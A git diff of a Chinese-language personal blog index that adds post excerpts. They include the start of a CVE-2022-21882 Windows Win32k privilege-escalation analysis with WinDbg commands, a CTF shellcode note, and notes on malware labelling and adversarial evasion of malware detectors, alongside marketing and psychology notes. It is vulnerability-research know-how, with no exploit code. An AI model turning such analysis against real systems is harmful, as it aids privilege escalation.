@@ -156,6 +156,524 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/Win-Rev01/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/CTF/Win-Rev01/" class="post-title-link" itemprop="url">Win_Rev01</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-01-09 11:00:12" itemprop="dateCreated datePublished" datetime="2023-01-09T11:00:12+08:00">2023-01-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-01-08 12:46:56" itemprop="dateModified" datetime="2023-01-08T12:46:56+08:00">2023-01-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="虎符-the-shellcode"><a href="#虎符-the-shellcode" class="headerlink" title="虎符_the_shellcode"></a>虎符_the_shellcode</h2><p><img src="/categories/CTF/Win-Rev01/1673151993119.png" alt="1673151993119"></p>
+<p>明显的循环结构；从开始直接结束的特征；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/CVE-2022-21882/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/CTF/CVE-2022-21882/" class="post-title-link" itemprop="url">Windows 权限提升漏洞cve-2022-21882</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-01-04 14:19:49" itemprop="dateCreated datePublished" datetime="2023-01-04T14:19:49+08:00">2023-01-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-08-27 18:51:44" itemprop="dateModified" datetime="2023-08-27T18:51:44+08:00">2023-08-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
+<p>Win10版本；Win32k权限提升漏洞 </p>
+</blockquote>
+<p> 该漏洞是之前CVE-2021-1732漏洞补丁的绕过。CVE-2022-21882是一个本地权限提升漏洞，攻击者利用该漏洞可以在Windows 10系统上获得管理员权限、创建新的管理员账户、执行特权命令。</p>
+<p> <strong>由dump分析入手，到漏洞原理剖析，再到漏洞的重现利用手法，最后到分析漏洞的影响函数、修补方式等，完整重现“由dump到POC”的全过程。</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//k  栈追踪</span><br><span class="line">//b给出每个函数的前三个参数</span><br><span class="line"> kd&gt; kb </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//u Address1 Address2，反汇编选定范围内的代码</span><br><span class="line"> kd&gt; u xxxDestroyWindow xxxDestroyWindow+34 </span><br><span class="line"> </span><br><span class="line"> //给出某个函数调用前的内容</span><br><span class="line"> kd&gt; u xxxMNCancel la</span><br><span class="line"> </span><br><span class="line"> //反汇编选定地址之前长度为Lnum的代码</span><br><span class="line"> kd&gt; ub xxxMNCancel+121 L5</span><br><span class="line"> //展示某个数据结构data type里的某个名称的对象</span><br><span class="line"> 0: kd&gt; dt tagPOPUPMENU -d spwndPopupMenu</span><br><span class="line"> win32k!tagPOPUPMENU</span><br><span class="line">   +0x008 spwndPopupMenu : Ptr32 tagWND</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+<p>xxxTrackPopupMenuEx的工作原理，熟悉界面编程的朋友都知道这是用于弹出一个Popup Menu的函数，那么在内核中它是如何工作的呢，这里笔者简单列出一下大概的工作的流程 ：</p>
+<p>(1). 创建Menu窗口对象： 根据HMENU等相关参数，创建最终弹出和展示的Menu窗口（通过xxxCreateWindowEx）</p>
+<p>(2). 分配和初始化当前线程的MenuState结构（xxxMNAllocMenuState）</p>
+<p>(3). 计算和设定Menu窗口的相关位置、属性等（通过FindBestPos/xxxSetWindowPos等）</p>
+<p>(4). 进入菜单循环，展示Menu并进入等待菜单选择的循环（xxxMNLoop），在进入循环前，会通过xxxWindowEvent来“播放”一个EVENT_SYSTEM_MENUPOPUPSTART的窗口事件，这个细节会在后面用到</p>
+<p>(5). 菜单被选择或取消，退出循环并销毁PopupMenu、Menu窗口对象和MenuState结构(xxxxxEndMenuLoop、xxxMNEndMenuState等)</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Notes/%E8%90%A5%E9%94%80%E9%80%BB%E8%BE%91/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/Notes/%E8%90%A5%E9%94%80%E9%80%BB%E8%BE%91/" class="post-title-link" itemprop="url">营销逻辑</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-12-28 17:08:58 / Modified: 18:53:10" itemprop="dateCreated datePublished" datetime="2022-12-28T17:08:58+08:00">2022-12-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
+<p>姜旭平</p>
+</blockquote>
+<p>营销的<strong>知识</strong>和方法是最重要的，工具手段是围绕目的服务的。</p>
+<h2 id="一-搜索引擎营销"><a href="#一-搜索引擎营销" class="headerlink" title="一.搜索引擎营销"></a>一.搜索引擎营销</h2><p>分析客户心理-&gt;关键词-&gt;客户根据关键词能够搜索出感兴趣的内容-&gt;客户点击后目的链接是精准的链接。</p>
+<p>客户搜索的关键词，反映出了他感<strong>兴趣</strong>的点；而他感兴趣的点，限制了他能够挑选的关键词的范围。</p>
+<h2 id="二-渠道和品牌"><a href="#二-渠道和品牌" class="headerlink" title="二.渠道和品牌"></a>二.渠道和品牌</h2><p>中国市场不缺客户，客户也在积极地寻找好的产品，所以重要的是渠道，让客户知道我的产品，知道我的产品的价值和利益。</p>
+<p>为建立渠道，关键是对<strong>人性</strong>的把握，给销售方一个理由卖你的产品而非友商的产品，不一定要让利，让它方便、提供服务、好的期望和市场反应都是谈判的稻草。（例如，以前通过送网络电话，让经销商卖自家瓜子；以前的三大运营商充话费送手机也算一点，但是要注意到社会发展的<strong>趋势</strong>，服务不能满足客户需求时，随着经济的发展，客户会办理多个电话卡）</p>
+<h3 id="品牌："><a href="#品牌：" class="headerlink" title="品牌："></a>品牌：</h3><p>品牌不是耳熟能详（例如恒源祥），而是一种理念的传播和价值认同。讲明白你的产品<strong>对客户的价值</strong>和利益，给客户一个购买的<strong>理由</strong>。</p>
+<p>现在的app或者网站上的锚点 ，可以收集足够多的数据，分析到<strong>客户的兴趣爱好和习惯</strong>。</p>
+<h2 id="三-引导消费"><a href="#三-引导消费" class="headerlink" title="三.引导消费"></a>三.引导消费</h2><p>推销当前社会已经不适用，<strong>多引导</strong>，让客户自己说服自己，自己体验到产品的价值。该买的人，一定会买。</p>
+<p>1.人的消费<strong>习惯</strong>不易逆转，由俭入奢易。（送质量更好的茶叶；花呗都是基于这样的原理）</p>
+<p>2.和气生财，多交朋友。(小利益的让出，会收获更大的利益。在合适的发展阶段，明白自己有多大的让利空间）</p>
+<p>3.多问一句来引导，而不是捆绑销售，把选择权留给客户（但是这个选择空间可以特殊设计，让客户最终选择我想要的）。(例如，卖牛肉面，问一句客户要鸡蛋、小菜吗？而不是直接设计为套餐给客户，当然事无绝对，这些附加的营收，会占据流水的很大份额)</p>
+<p>4.体验，比推荐更有杀伤力。(30天无理由退款，线下体验店基于此原理)</p>
+<p>5.讲清楚利益和价值，<strong>客户为什么买</strong>。找到客户关心的(例如，正例：强生公司在美国讲健康，在中国讲教育；反例：没人乐意当银行的垃圾邮件接收器，成为银行VIP得不到什么好处)。</p>
+<p>分析市场特点，找对客户关心的内容，与自己产品建立联系，没有联系也无妨，包含自己产品的内容非常重要，要和客户的兴趣点相对应，这些设计最终要实现目的：<strong>客户转化成利益</strong>。</p>
+<h2 id="四-自媒体时代"><a href="#四-自媒体时代" class="headerlink" title="四.自媒体时代"></a>四.自媒体时代</h2><p>两个特点：1.信息谁都可以发送和接收；2.会自动形成兴趣小组，群体会自动聚类；</p>
+<p>信息：每个人都可以创造性加工，也都可以选择性接受。</p>
+<p><strong>病毒式/社会化营销：4I s原则</strong>：Interesting 、Interests、Innovation、interactive，用户感兴趣是前提，价值观、逆向思维是核心，观点功能方法要创新，与客户互动、给客户创造秀的机会、让客户形成社群自己发热。</p>
+<p>典型案例：18年，Elon Mask就拿火箭发射汽车，借助<strong>社会化媒体</strong>自我宣传了；实际意义有的时候不重要，制造话题、并且话题能够和产品的特点有所融合，节省的广告费最终会是赚的。（例如：火箭的运输能力，汽车的高科技感的营造）</p>
+<h2 id="五-人性"><a href="#五-人性" class="headerlink" title="五.人性"></a>五.人性</h2><p>凑热闹，喜欢虚假的安全感，喜欢别人设计的意义。</p>
+<p>例如，褚橙：甄嬛体活动（蹭热度，制造热度），有一个就够了的广告词&lt;-&gt;与男女感情建立联系，只要打印这样的包装即可，产品不重要，营造出来的价值，符合冬天各种节日里的男女的需要；符合女士爱美、追求时尚的特征即可。</p>
+<h2 id="六-大数据"><a href="#六-大数据" class="headerlink" title="六.大数据"></a>六.大数据</h2><p>找到客户的兴趣点，瞄准其<strong>真实需求</strong>做产品。</p>
+<p>大量、多变、高频的数据，可以消除数据里的异常数据的干扰，获取到客户下意识的、真实的想法。</p>
+<h2 id="七-人力资源的思考"><a href="#七-人力资源的思考" class="headerlink" title="七.人力资源的思考"></a>七.人力资源的思考</h2><blockquote>
+<p>王雪莉</p>
+</blockquote>
+<p>1.人力资源既是成本，也是资产。考察一个人的成本，看工资是否合适，应该拿他创造的收益-工资。同样的，作为求职者，要创造价值，<strong>给公司带来大于工资的收益</strong>。</p>
+<p>2.眼界放开。公司限制竞业会跨越很多行业，同样的，求职范围不要局限于互联网，凡是有交叉的范围都可以去试试。</p>
+<p>3.物质激励效用递减时，当前的管理层给员工创造的是<strong>兴趣、意义、希望</strong>，让员工看到快速上升的希望。</p>
+<p>4.每一代人有每一代人的性格特点，管理永远是对人的，让他把力气发挥正确即可。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Notes/%E5%8F%98%E6%80%81%E5%BF%83%E7%90%86%E5%AD%A601/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/Notes/%E5%8F%98%E6%80%81%E5%BF%83%E7%90%86%E5%AD%A601/" class="post-title-link" itemprop="url">变态心理学</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-12-27 17:08:58 / Modified: 22:07:33" itemprop="dateCreated datePublished" datetime="2022-12-27T17:08:58+08:00">2022-12-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>课程链接：北大 钱铭怡教授 <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1ZK41167vh">变态心理学</a></p>
+</blockquote>
+<h2 id="一-课程内容"><a href="#一-课程内容" class="headerlink" title="一.课程内容"></a>一.课程内容</h2><p>Abnormal Psychology异常心理发生、发展变化的规律和原因。</p>
+<ul>
+<li>描述：异常表现、与正常现象的区别、障碍、预后</li>
+<li>原因：考察生物、心理、社会方面的因素</li>
+<li>治疗：途径及效果等  （心理咨询、心理治疗、临床心理学课程里重点介绍；神经解剖：神经系统疾病）</li>
+</ul>
+<p>心理障碍继续加重、时间长了会变成精神病。（错，例如强迫症，需要看此人的症状表现是其他病比如分裂症的前期表现，还是仅仅为强迫症）</p>
+<h3 id="几个概念："><a href="#几个概念：" class="headerlink" title="几个概念："></a>几个概念：</h3><ul>
+<li>神经病(neuropathy)：神经系统出现障碍时表现出的疾病。例如：脊髓出现问题</li>
+<li>精神/心理障碍(mental disorders)：精神分裂、心境障碍、神经症、焦虑障碍、人格障碍、社交障碍等。</li>
+<li>精神病(psychosis)：患者的心理功能严重受损，自知力（例如幻听却不自知）缺失，不能应付日常生活要求并保持与现实 的接触的一组情况。例如精神分裂症。</li>
+<li>psychological disorders心理障碍:偏重于说明重 性精神病、器质性精神障碍以外的那些更多地由心理原因所致的障碍</li>
+</ul>
+<p>2009年，Phillips的调查就显示，中国成年人群精神障碍总现患率为17.5%；女性、40岁以上在心境障碍和焦虑障碍上都更严重；物质滥用尤其是酒依赖上，男性超过女性，农村超过城市。</p>
+<blockquote>
+<p>2012年，《中华人民共和国精神卫生法》通过。</p>
+</blockquote>
+<h3 id="正常和异常的判断"><a href="#正常和异常的判断" class="headerlink" title="正常和异常的判断"></a>正常和异常的判断</h3><p>1.患者自身认识，研究者主观判断；<br>2.社会文化传统；<br>3.心理测量学，以统计的视角判断离群情况，一般重点关注分布的两端；<br>4.病因和症状存在与否，现象学的标准（无法通过化验等精准手段判断）</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/categories/Notes/%E5%8F%98%E6%80%81%E5%BF%83%E7%90%86%E5%AD%A601/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/MC%E6%95%B0%E6%8D%AE%E9%9B%86%E7%94%9F%E6%88%90%E5%8A%9E%E6%B3%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/ML/MC%E6%95%B0%E6%8D%AE%E9%9B%86%E7%94%9F%E6%88%90%E5%8A%9E%E6%B3%95/" class="post-title-link" itemprop="url">给样本贴标签的办法</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-12-24 14:12:58 / Modified: 20:40:44" itemprop="dateCreated datePublished" datetime="2022-12-24T14:12:58+08:00">2022-12-24</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ML/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="AVCLASS"><a href="#AVCLASS" class="headerlink" title="AVCLASS"></a>AVCLASS</h2><p>三大挑战：规范化（相对于使用AV提供的完整标签而言），通用标记删除，别名检测</p>
+<p>采取AV vendors多数投票，需要选择出一些打标签比较好的检测引擎，而检测引擎往往对于某一类准确率高，而对于另一类又比较差；也无法定量评估标签的质量。</p>
+<p>已知某些引擎会抄袭leader引擎的标签结果。</p>
+<p>AVCLASS可以代替聚类过程和给聚类结果打标签。</p>
+<h2 id="AVCLASS2"><a href="#AVCLASS2" class="headerlink" title="AVCLASS2"></a>AVCLASS2</h2><p>2020</p>
+<blockquote>
+<p>Silvia Sebastián, Juan Caballero. AVClass2: Massive Malware Tag Extraction from AV Labels. In proceedings of the Annual Computer Security Applications Conference, December 2020. </p>
+</blockquote>
+<p>AVLASS2借助VT的json可以获得下面的结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aca2d12934935b070df8f50e06a20539 33 CLASS:grayware|10,CLASS:grayware:adware|9,FILE:os:windows|8,FAM:adrotator|8,CLASS:downloader|3,FAM:zlob|2</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/%E6%A8%A1%E5%9E%8B%E8%A7%A3%E9%87%8A%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%AF%B9%E6%8A%97%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/ML/%E6%A8%A1%E5%9E%8B%E8%A7%A3%E9%87%8A%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%AF%B9%E6%8A%97%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">对抗样本研究</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-12-21 18:14:53" itemprop="dateCreated datePublished" datetime="2022-12-21T18:14:53+08:00">2022-12-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-12-27 22:02:08" itemprop="dateModified" datetime="2022-12-27T22:02:08+08:00">2022-12-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ML/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a target="_blank" rel="noopener" href="https://www.av-test.org/en/statistics/malware/">AV-Test</a></p>
+<blockquote>
+<p>乔延成</p>
+</blockquote>
+<p><img src="/categories/ML/%E6%A8%A1%E5%9E%8B%E8%A7%A3%E9%87%8A%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%AF%B9%E6%8A%97%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF/1669032568781.png" alt="1669032568781"></p>
+<h2 id="恶意代码对抗样本研究存在的困难"><a href="#恶意代码对抗样本研究存在的困难" class="headerlink" title="恶意代码对抗样本研究存在的困难"></a>恶意代码对抗样本研究存在的困难</h2><p>图像对抗样本<br>·数值是连续的<br>·限制:添加的扰动人类无法察觉恶意代码对抗样本<br>·字节数据、系统调用等特征数值是离散的(基于梯度的方法无法使用)·限制:添加的扰动不能影响恶意代码的原有功能</p>
+<p><img src="/categories/ML/%E6%A8%A1%E5%9E%8B%E8%A7%A3%E9%87%8A%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%AF%B9%E6%8A%97%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF/1669032652118.png" alt="1669032652118"></p>
+<ul>
+<li>恶意代码检测模型决策依据分析</li>
+<li>恶意代码对抗样本检测方法</li>
+<li>恶意代码对抗样本攻击方法</li>
+</ul>
+<p><img src="/categories/ML/%E6%A8%A1%E5%9E%8B%E8%A7%A3%E9%87%8A%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%AF%B9%E6%8A%97%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF/1669032908841.png" alt="1669032908841"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/XGBoost01/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -210,7 +728,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="集成学习"><a href="#集成学习" class="headerlink" title="集成学习"></a>集成学习</h2><ul>
+          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="集成学习"><a href="#集成学习" class="headerlink" title="集成学习"></a>集成学习</h2><ul>
 <li><p>bagging: 随机森林</p>
 </li>
 <li><p>boosting: adaboost,GBDT,XGboost，LGBM</p>
@@ -307,7 +825,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          
+          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>
       
     </div>
 
@@ -380,7 +898,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <blockquote>
+          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
 <p>主动学习，半监督学习的一种，让模型决定哪个数据点被打标签，减少执行任务所需要的监督量。</p>
 <p>用在 犯错误成本很高，而请求标签成本较小的领域中。</p>
 <p>方法：某些example提供最多的信息，某些数据打什么标签具有极大的不确定性。传统的办法是</p>
@@ -460,556 +978,8 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p><a target="_blank" rel="noopener" href="https://github.com/markpwoodward/active_osl">Code02</a></p>
+          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a target="_blank" rel="noopener" href="https://github.com/markpwoodward/active_osl">Code02</a></p>
 <p>强化学习和小样本学习的结合，使得模型在分类过程中决定哪些样本值得打上标签。<br>本文的分类任务：提供一系列图片，在每个时间步内，做一个决定，预测标签，或者支付代价获取正确的标签。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/%E6%81%B6%E6%84%8F%E6%A3%80%E6%B5%8B%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E9%9B%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/ML/%E6%81%B6%E6%84%8F%E6%A3%80%E6%B5%8B%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E9%9B%86/" class="post-title-link" itemprop="url">恶意检测常用数据集</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
